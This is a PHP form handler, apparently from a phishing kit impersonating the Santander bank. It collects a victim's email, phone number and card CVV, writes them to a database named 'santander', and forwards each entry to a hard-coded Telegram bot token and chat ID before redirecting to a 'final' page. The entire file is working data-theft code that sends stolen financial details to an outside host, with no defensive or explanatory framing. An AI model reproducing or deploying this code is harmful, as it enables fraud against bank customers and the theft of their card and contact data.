<?php
// Función para enviar mensaje a Telegram
function enviarATelegram($botToken, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array('chat_id' => $chatID, 'text' => $mensaje);

    // Usar cURL para realizar la solicitud POST
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/x-www-form-urlencoded"));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// Verifica si se reciben datos del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  
    // Recupera los datos del formulario
    $correo = $_POST["correo"];
    $telefono = $_POST["telefono"];
    $cvv = $_POST["cvv"];

    // Conecta a la base de datos (cambia los valores según tu configuración)
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "santander";

    // Crear conexión
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica la conexión
    if ($conn->connect_error) {
        die("La conexión a la base de datos falló: " . $conn->connect_error);
    }

    // Escapa los datos para prevenir inyección de SQL
    $correoEscapado = $conn->real_escape_string($correo);
    $telefonoEscapado = $conn->real_escape_string($telefono);
    $cvvEscapado = $conn->real_escape_string($cvv);

    // Inserta los datos en la base de datos
    $sql = "INSERT INTO datos (correo, telefono, cvv) VALUES ('$correoEscapado', '$telefonoEscapado', '$cvvEscapado')";

    if ($conn->query($sql) === TRUE) {
        // Datos insertados en la base de datos correctamente
        // Ahora envía los datos al bot de Telegram
        $botToken = "6169082160:AAGqt-AE-PLtLloU2lra76qrw7qduYuhdVY";
        $chatID = "2023990069";
        $mensaje = "Nueva entrada:\nCorreo: $correo\nTeléfono: $telefono\nCVV: $cvv";
        
        $resultadoTelegram = enviarATelegram($botToken, $chatID, $mensaje);

        // Verifica si el mensaje se envió correctamente a Telegram
        if ($resultadoTelegram) {
            // Redirige al usuario a final.html
            header("Location: final.html");
            exit();
        } else {
            echo "Error al enviar mensaje a Telegram";
        }
    } else {
        echo "Error al insertar datos: " . $conn->error;
    }

    // Cierra la conexión
    $conn->close();
}
?>